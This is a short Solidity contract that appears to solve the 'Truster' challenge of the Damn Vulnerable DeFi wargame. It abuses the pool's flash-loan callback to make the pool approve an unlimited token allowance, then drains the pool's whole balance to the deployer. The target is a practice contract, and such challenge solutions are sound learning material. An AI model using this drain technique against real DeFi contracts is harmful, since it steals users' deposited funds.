// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract TrusterLenderPoolExp {
    constructor(TrusterLenderPool pool) {
        DamnValuableToken token = pool.token();
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                -1
            )
        );
        token.transferFrom(
            address(pool),
            address(msg.sender),
            token.balanceOf(address(pool))
        );
    }
}
